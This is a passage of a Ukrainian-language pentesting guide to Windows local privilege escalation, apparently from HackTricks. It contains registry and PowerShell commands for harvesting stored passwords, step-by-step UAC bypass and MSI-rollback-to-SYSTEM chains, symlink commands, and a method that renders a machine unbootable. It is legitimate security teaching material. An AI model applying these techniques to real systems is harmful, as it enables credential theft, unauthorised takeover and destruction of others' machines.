REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти, які шукають passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** плагін. Я створив цей плагін, щоб **автоматично виконувати всі metasploit POST module, які шукають credentials** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять passwords, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для витягування password з системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **sessions**, **usernames** та **passwords** кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявіть, що **процес, запущений як SYSTEM, відкриває новий процес** (`OpenProcess()`) з **full access**. Той самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковуючи всі відкриті handles головного процесу**.\
Тоді, якщо у вас є **full access до процесу з низькими привілеями**, ви можете отримати **відкритий handle до привілейованого процесу, створеного** з `OpenProcess()`, і **інжектнути shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Сегменти спільної пам'яті, які називають **pipes**, дозволяють процесам обмінюватися даними та передавати інформацію.

Windows надає можливість під назвою **Named Pipes**, що дозволяє несуміжним процесам ділитися даними, навіть через різні мережі. Це нагадує архітектуру client/server, де ролі визначені як **named pipe server** і **named pipe client**.

Коли дані відправляються через pipe **клієнтом**, **сервер**, який створив pipe, має змогу **перейняти особу** цього **клієнта**, за умови наявності необхідних прав **SeImpersonate**. Ідентифікація **привілейованого процесу**, який спілкується через pipe, який ви можете імітувати, дає можливість **отримати вищі привілеї**, перейнявши особу цього процесу, коли він взаємодіє з pipe, який ви створили. Інструкції для виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) та [**тут**](#from-high-integrity-to-system).

Також наступний інструмент дозволяє **перехоплювати комунікацію named pipe за допомогою інструменту на кшталт burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дозволяє перелічити та побачити всі pipes, щоб знайти privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Служба Telephony (TapiSrv) у server mode експонує `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати шляхом асинхронних подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **4-byte write** до будь-якого існуючого файлу, записуваного `NETWORK SERVICE`, а потім отримати права Telephony admin і завантажити довільний DLL як сервіс. Повний сценарій:

- `ClientAttach` з `pszDomainUser`, встановленим на записуваний існуючий шлях → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для асинхронних записів подій.
- Кожна подія записує керований атакуючим `InitContext` з `Initialize` у цей handle. Зареєструйте line app через `LRegisterRequestRecipient` (`Req_Func 61`), спровокуйте `TRequestMakeCall` (`Req_Func 121`), отримаєте через `GetAsyncEvents` (`Req_Func 0`), потім скасуйте/завершіть для повторюваних детермінованих записів.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, перепідключіться, потім викличте `GetUIDllName` з довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Більше деталей:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### File Extensions that could execute stuff in Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links, передані до `ShellExecuteExW`, можуть викликати небезпечні URI handlers (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і виконувати файли, контрольовані атакуючим, від імені поточного користувача. Див. також:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг рядків команд на наявність паролів**

Коли ви отримуєте shell як користувач, можуть бути scheduled tasks або інші процеси, які виконуються і **передають облікові дані в командному рядку**. Скрипт нижче захоплює command lines процесів кожні дві секунди і порівнює поточний стан з попереднім, виводячи будь-які відмінності.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можливо запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM" з прав звичайного користувача.

Це дозволяє підвищити привілеї та одночасно обійти UAC, використавши ту саму вразливість. Додатково, немає потреби нічого встановлювати, а бінарний файл, що використовується в процесі, підписаний і випущений Microsoft.

Деякі з уражених систем:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Щоб експлуатувати цю вразливість, необхідно виконати наступні кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака фактично полягає в зловживанні функцією rollback Windows Installer для заміни легітимних файлів на шкідливі під час процесу деінсталяції. Для цього атакуючому потрібно створити **шкідливий MSI installer**, який буде використано для перехоплення папки `C:\Config.Msi`, яку потім Windows Installer використовуватиме для збереження rollback-файлів під час деінсталяції інших MSI-пакетів, де rollback-файли були б змінені, щоб містити шкідливий payload.

Скорочено техніка виглядає так:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей потік зберігає **індексні метадані** папки.

Отже, якщо ви **видалите потік `::$INDEX_ALLOCATION`** папки, NTFS **видаляє всю папку** з файлової системи.

Ви можете зробити це, використовуючи стандартні API видалення файлів, такі як:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте *файл* delete API, воно **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
А що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але він **дозволяє видалення *вмісту* папки, керованої нападником**?

1. Крок 1: Налаштуйте підставну папку та файл
- Створіть: `C:\temp\folder1`
- Всередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Розмістіть **oplock** на `file1.txt`
- Oplock **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Ініціюйте процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **oplock спрацьовує** і передає контроль вашому callback.

4. Крок 4: У callback-і oplock – перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
- Це звільняє `folder1`, не порушуючи oplock.
- Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Варіант C: Створити **symlink** в `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це націлено на внутрішній потік NTFS, який зберігає метадані папки — його видалення видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує виконуватись і намагається видалити `file1.txt`.
- Але тепер, через junction + symlink, він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Результат**: `C:\Config.Msi` видаляється SYSTEM.

### Від Arbitrary Folder Create до постійного DoS

Використайте примітив, який дозволяє вам **create an arbitrary folder as SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **critical Windows driver**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає `cng.sys` kernel-mode driver.
- Якщо ви **попередньо створите його як папку**, Windows не зможе завантажити реальний драйвер під час boot.
- Потім Windows намагається завантажити `cng.sys` під час boot.
- Воно бачить папку, **не може вирішити реальний драйвер**, і **падає або зупиняє завантаження**.
- Немає **резервного варіанту**, і **відновлення неможливе** без зовнішнього втручання (наприклад, відновлення завантаження або доступ до диска).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Коли **привілейований сервіс** записує логи/експорти в шлях, який читається з **конфігурації, доступної для запису**, перенаправте цей шлях за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити привілейований запис у довільний перезапис (навіть **без** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Конфігурація, що зберігає цільовий шлях, доступна для запису атакуючому (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити a mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Привілейована операція, яка записує в цей шлях (log, export, report).

**Example chain**
1. Прочитайте конфігурацію, щоб відновити місце призначення привілейованого логу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` в `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адмін викликає "send test SMS"). Запис тепер потрапляє в `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (hex/PE parser), щоб підтвердити пошкодження; перезавантаження змушує Windows завантажити підроблений шлях драйвера → **boot loop DoS**. Це також узагальнюється на будь-який захищений файл, який привілейована служба відкриє для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія існує в `C:\Windows\System32\cng.sys`, її можна спробувати завантажити першою, що робить її надійним DoS sink для пошкоджених даних.



## **Від High Integrity до System**

### **Нова служба**

Якщо ви вже працюєте в процесі High Integrity, **шлях до SYSTEM** може бути простим — просто **створити й запустити нову службу**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> При створенні service binary переконайтеся, що це дійсна service або що binary виконує необхідні дії достатньо швидко, бо воно буде вбитe через 20s, якщо це не дійсна service.

### AlwaysInstallElevated

З процесу High Integrity ви можете спробувати **enable the AlwaysInstallElevated registry entries** та **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо у вас є ці token привілеї (ймовірно ви знайдете їх в уже High Integrity процесі), ви зможете **open almost any process** (не protected processes) з привілеєм SeDebug, **copy the token** процесу і створити **arbitrary process with that token**.\
Зазвичай ця техника полягає в **selected any process running as SYSTEM with all the token privileges** (_так, можна знайти SYSTEM процеси без усіх token привілеїв_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для ескалації в `getsystem`. Техніка полягає у **creating a pipe and then create/abuse a service to write on that pipe**. Потім **server**, який створив pipe використовуючи привілей **`SeImpersonate`**, зможе **impersonate the token** клієнта pipe (service), отримавши SYSTEM привілеї.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **hijack a dll**, яка **loaded** процесом що працює як **SYSTEM**, ви зможете виконати arbitrary code з цими правами. Тому Dll Hijacking також корисний для такого виду ескалації привілеїв, і, більш того, набагато **easier to achieve from a high integrity process**, оскільки він матиме **write permissions** у папках, які використовуються для завантаження dll.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє на misconfigurations та sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє на можливі misconfigurations та збирає інформацію (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє на misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережену інформацію сесій PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує credentials з Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray зібраних паролів по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh це PowerShell ADIDNS/LLMNR/mDNS spoofer та man-in-the-middle інструмент.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базова privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих privesc вразливостей (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потребує Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих privesc вразливостей (потрібно скомпілювати через VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перебирає хост у пошуках misconfigurations (скоріше інструмент для збору інформації ніж privesc) (потрібно скомпілювати) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує credentials з багатьох програм (precompiled exe в github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка на misconfiguration (exe precompiled в github). Не рекомендовано. Погано працює на Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих misconfigurations (exe з python). Не рекомендовано. Погано працює на Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент створений на основі цього посту (не потребує accesschk для коректної роботи, але може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає output **systeminfo** і рекомендує робочі експлойти (локальний python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає output **systeminfo** та recommends робочі експлойти (локальний python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Посилання

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
